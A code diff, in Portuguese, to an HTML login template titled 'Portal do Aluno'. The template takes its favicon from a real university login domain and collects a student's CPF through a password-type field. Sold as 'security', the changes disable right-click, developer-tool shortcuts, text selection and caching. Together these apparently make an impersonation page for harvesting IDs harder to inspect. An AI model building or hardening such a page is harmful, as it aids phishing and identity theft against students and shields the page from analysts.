@@ -3,6 +3,12 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <!-- SEGURANÇA: Prevenção de Cache Estrito para evitar vazamento de dados em computadores públicos (LGPD) -->
+    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+    <meta http-equiv="Pragma" content="no-cache">
+    <meta http-equiv="Expires" content="0">
+    
     <title>Portal do Aluno - Autenticação Digital</title>
     <!-- Favicon Oficial -->
     <link rel="icon" href="https://login.anhanguera.com/favicon.ico" type="image/x-icon">
@@ -12,7 +18,18 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
-        body { font-family: 'Inter', sans-serif; }
+        
+        body { 
+            font-family: 'Inter', sans-serif; 
+            /* SEGURANÇA: Dificulta seleção de texto para evitar adulteração visual e cópias */
+            -webkit-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            user-select: none;
+        }
+
+        /* Permite seleção apenas nos inputs/selects para não quebrar a usabilidade de preenchimento */
+        input, textarea, select { user-select: auto; -webkit-user-select: auto; }
         
         /* Animação para o Carrossel de Propagandas */
         @keyframes marquee {
@@ -61,17 +78,18 @@
                     </div>
                 {% endif %}
 
-                <!-- Formulário -->
-                <form method="POST" class="w-full">
+                <!-- Formulário com Trava Anti-Duplo Clique -->
+                <form method="POST" class="w-full" onsubmit="return blindarLogin(this)">
                     <input type="hidden" name="csrf_token" value="{{ csrf_token() }}">
                     
                     <div class="mb-6">
                         <label for="senha" class="block text-[#212121] text-[15px] font-semibold mb-3">CPF</label>
-                        <input type="password" id="senha" name="senha" required placeholder="Digite seu usuário" 
+                        <!-- SEGURANÇA: autocomplete="off" para evitar salvar dados indevidos do CPF -->
+                        <input type="password" id="senha" name="senha" required placeholder="Digite seu usuário" autocomplete="off"
                                class="w-full p-4 bg-transparent border border-[#b3b3b3] text-[#212121] text-[16px] lg:text-[17px] rounded-md focus:outline-none focus:border-[#CC4500] focus:ring-1 focus:ring-[#CC4500] placeholder-gray-500">
                     </div>
                     
-                    <button type="submit" class="w-full bg-gradient-to-r from-[#1a73e8] to-[#1557b0] text-white font-bold py-4 px-4 rounded-md text-[16px] lg:text-[17px] hover:shadow-lg hover:from-[#1557b0] hover:to-[#0d47a1] transition duration-300 mt-2">
+                    <button type="submit" id="btnSubmitLogin" class="w-full bg-gradient-to-r from-[#1a73e8] to-[#1557b0] text-white font-bold py-4 px-4 rounded-md text-[16px] lg:text-[17px] hover:shadow-lg hover:from-[#1557b0] hover:to-[#0d47a1] transition duration-300 mt-2">
                         Avançar
                     </button>
                 </form>
@@ -354,9 +372,10 @@
     </div>
     {% endif %}
 
-    <!-- Script de Controlo do Menu Mobile -->
+    <!-- SCRIPTS DE SEGURANÇA E INTERFACE -->
     <script>
         document.addEventListener('DOMContentLoaded', function() {
+            // Controlo do Menu Mobile
             const menuToggle = document.getElementById('menu-toggle');
             const sidebar = document.getElementById('sidebar');
             const overlay = document.getElementById('sidebar-overlay');
@@ -369,6 +388,40 @@
                 
                 menuToggle.addEventListener('click', toggleMenu);
                 overlay.addEventListener('click', toggleMenu);
+            }
+        });
+
+        // ==========================================
+        // SEGURANÇA: Bloqueio de Duplo Envio (Login)
+        // ==========================================
+        function blindarLogin(form) {
+            const btn = document.getElementById('btnSubmitLogin');
+            if (btn.disabled) {
+                return false; // Trava se já foi clicado
+            }
+            
+            // Efeito visual indicando processamento (Tailwind classes)
+            btn.disabled = true;
+            btn.innerHTML = '<i class="fa-solid fa-circle-notch fa-spin"></i> Autenticando...';
+            btn.classList.add('opacity-75', 'cursor-not-allowed');
+            return true;
+        }
+
+        // ==========================================
+        // SEGURANÇA: Anti-Inspect / Anti-Tampering
+        // ==========================================
+        
+        // Desabilita o botão direito (Inspecionar/Salvar)
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault(); 
+        });
+
+        // Desabilita atalhos de teclado de desenvolvedor (F12, Ctrl+Shift+I, etc)
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'F12' || 
+               (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'i' || e.key === 'C' || e.key === 'c' || e.key === 'J' || e.key === 'j')) || 
+               (e.ctrlKey && (e.key === 'U' || e.key === 'u'))) {
+                e.preventDefault();
             }
         });
     </script>
